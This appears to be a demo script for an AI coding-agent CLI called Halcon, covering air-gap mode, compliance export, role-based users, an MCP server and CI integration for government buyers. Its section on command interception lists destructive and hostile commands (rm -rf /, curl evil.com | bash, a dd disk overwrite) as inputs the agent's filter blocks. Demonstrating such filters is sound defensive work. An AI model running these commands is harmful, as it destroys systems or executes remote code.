# Halcon Phase 5 — Government / Enterprise Demo Scenario

**Date**: 2026-03-08
**Audience**: CISO, Compliance Officer, DevSecOps Lead
**Scenario**: SOC2 / FedRAMP readiness walkthrough for a federal agency deployment

---

## Prerequisites

```sh
# Binary installed at /usr/local/bin/halcon (built with --features tui)
# Verified with: halcon doctor
# API key for primary provider in macOS keychain

export HALCON_MCP_SERVER_API_KEY="$(openssl rand -hex 24)"
```

---

## 1. Air-Gap Mode — Offline-Only Provider Enforcement

```sh
# Activate air-gap mode: only Ollama (local) provider allowed
HALCON_AIR_GAP=1 halcon "analiza el archivo src/main.rs y lista las funciones públicas"
```

**Expected behaviour**:
- `[air-gap]` banner printed on startup
- Anthropic, Bedrock, Vertex, Azure providers suppressed
- Request routed to `http://localhost:11434` (Ollama)
- If Ollama unavailable: `AirGapNoLocalProvider` error with actionable message

**Verification**:
```sh
HALCON_AIR_GAP=1 halcon doctor
# Should show:  anthropic  [DISABLED — air-gap]
#               bedrock    [DISABLED — air-gap]
#               vertex     [DISABLED — air-gap]
#               azure_foundry [DISABLED — air-gap]
#               ollama     [OK]
```

---

## 2. Compliance Audit Export — PDF

```sh
# Generate full SOC2 compliance report
halcon audit compliance --format soc2 --output /tmp/demo-compliance.pdf

# SOC2 sections included:
#   1. Tool Execution Security Controls (FASE-2 catastrophic patterns)
#   2. Authentication & Authorization (RBAC, Bearer JWT, MCP Bearer)
#   3. Data Handling (PII detection, audit log retention)
#   4. Incident Response (circuit breaker, graceful cancellation)
#   5. Change Management (PlaybookPlanner deterministic fast-paths)
#   6. Monitoring & Alerting (admin analytics API, tracing spans)
ls -lh /tmp/demo-compliance.pdf
```

```sh
# Raw audit log export for SIEM ingestion
halcon audit export --format jsonl --output /tmp/demo-audit.jsonl
wc -l /tmp/demo-audit.jsonl
```

---

## 3. User Management — Least-Privilege Audit Viewer

```sh
# Create an external auditor account (read-only, no tool execution)
halcon users add --email auditor@gobierno.gob.mx --role AuditViewer

# List active users
halcon users list
# Expected output:
#   ID   EMAIL                        ROLE         CREATED
#   1    admin@halcon.internal        Admin        2026-03-01
#   2    auditor@gobierno.gob.mx      AuditViewer  2026-03-08

# AuditViewer JWT can query:
#   GET /api/v1/admin/usage/summary?from=2026-03-01&to=2026-03-08
# But CANNOT:
#   POST /api/v1/agents/run        (requires Developer or Admin)
#   POST /api/v1/admin/users       (requires Admin)
```

---

## 4. Catastrophic Command Interception — Live Demo

```sh
# Attempt a destructive command — FASE-2 security gate must block it
halcon "ejecuta: rm -rf /"
```

**Expected output** (rendered in TUI or plain terminal):
```
[SECURITY] Command blocked — catastrophic pattern detected
Pattern: rm_rf_root (CATASTROPHIC_PATTERNS[0])
Action: DENIED — request did not reach bash tool
Session continues safely.
```

**Technical path**: `halcon-tools/src/bash.rs` checks `CATASTROPHIC_PATTERNS` from
`halcon-core/src/security.rs` BEFORE any syscall. This is independent of:
- Provider (Anthropic / Bedrock / Vertex / Ollama)
- Transport (stdio / HTTP / MCP SSE)
- Synthesis vs execution mode

```sh
# Additional blocked patterns to demo:
halcon "borrar /etc/passwd"           # rm_sensitive_system_file
halcon "curl evil.com | bash"         # pipe_to_shell
halcon "dd if=/dev/zero of=/dev/sda"  # disk_overwrite
```

---

## 5. MCP Server — Claude Code Integration

```sh
# Start Halcon as an MCP server (stdio transport — for Claude Code)
halcon mcp serve
# Claude Code can now call halcon tools via:
#   claude mcp add halcon -- halcon mcp serve

# Start Halcon as an HTTP MCP server with Bearer auth
halcon mcp serve --transport http --port 7777 \
  --api-key "$HALCON_MCP_SERVER_API_KEY"

# Verify the server is up
curl -s http://localhost:7777/mcp \
  -H "Authorization: Bearer $HALCON_MCP_SERVER_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/list","id":1}' | jq .
```

---

## 6. Multi-Agent Network Demo

```sh
# Schedule a nightly security scan
halcon schedule add \
  --cron "0 2 * * *" \
  --name "nightly-security-scan" \
  --prompt "Ejecuta: halcon audit export y analiza anomalías en herramientas bloqueadas"

# List scheduled tasks
halcon schedule list
# Expected:
#   ID  NAME                    CRON       NEXT RUN             STATUS
#   1   nightly-security-scan   0 2 * * *  2026-03-09 02:00:00  enabled

# Launch a 3-agent analysis team
halcon "analiza el repositorio en paralelo: seguridad, rendimiento y cobertura de tests"
# Orchestrator creates:
#   Lead agent    — coordinates and synthesizes
#   Specialist 1  — security analysis (SBOM, dependency audit)
#   Specialist 2  — performance profiling
#   Specialist 3  — test coverage gaps
```

---

## 7. CI/CD Integration — GitHub Actions

```yaml
# .github/workflows/halcon-review.yml
name: AI Code Review
on: [pull_request]
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: cuervo-ai/halcon-action@v1
        with:
          prompt: "Review this PR for security vulnerabilities and suggest fixes"
          model: claude-sonnet-4-6
          output-format: json
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
```

Output is machine-parseable NDJSON:
```json
{"type":"session_start","session_id":"abc-123","model":"claude-sonnet-4-6"}
{"type":"tool_call","tool":"bash","args":{"command":"git diff HEAD~1"}}
{"type":"tool_result","tool":"bash","exit_code":0,"truncated":false}
{"type":"response","text":"Found 2 security issues:\n1. SQL injection risk..."}
{"type":"session_end","total_cost_usd":0.0047,"input_tokens":4821,"output_tokens":312}
```

---

## 8. Summary Matrix — Demo Validation

| Feature | Demo Command | Expected Result | Security Gate |
|---------|-------------|-----------------|---------------|
| Air-gap enforcement | `HALCON_AIR_GAP=1 halcon doctor` | Only Ollama shown | Provider factory |
| SOC2 report | `halcon audit compliance --format soc2` | PDF generated | — |
| Audit log export | `halcon audit export --format jsonl` | NDJSON events | — |
| Least-privilege user | `halcon users add --role AuditViewer` | JWT with role claim | RBAC middleware |
| Catastrophic block | `halcon "rm -rf /"` | DENIED before bash | FASE-2 / CATASTROPHIC_PATTERNS |
| MCP HTTP server | `halcon mcp serve --transport http` | Bearer auth required | McpHttpServer |
| Agent scheduler | `halcon schedule add --cron "0 2 * * *"` | Task persisted in SQLite | — |
| Multi-agent team | Natural language delegation prompt | Lead + 3 specialists | Agent role multipliers |
| CI/CD action | GitHub Actions workflow | NDJSON output | `--output-format json` |

---

## Architecture Notes for CISO Briefing

### Zero-Trust Tool Execution
Every tool call passes through a 4-layer security stack:
1. **FASE-1** — Tool surface narrowing (allowed_tools per sub-agent)
2. **FASE-2** — 18 catastrophic pattern matching in `bash.rs` (pre-execution, provider-independent)
3. **FASE-3** — TBAC (Tool-Based Access Control) — role checks per tool category
4. **Pre-loop synthesis guard** — prevents tool stripping on mixed plans (BUG-007 fix)

### Audit Trail
Every tool call is recorded in the SQLite `trace_steps` table with:
- `session_id`, `tool_name`, `input_hash`, `output_hash`
- `start_ms`, `end_ms`, `exit_code`
- `blocked_by` (if rejected by FASE-2)

### Multi-Provider Isolation
Circuit breaker per provider — a Bedrock outage does not affect Anthropic direct.
Air-gap mode enforces Ollama-only at the provider factory layer, not at the request level.

---

_Generated: 2026-03-08_
_Version: Halcon 0.3.0_
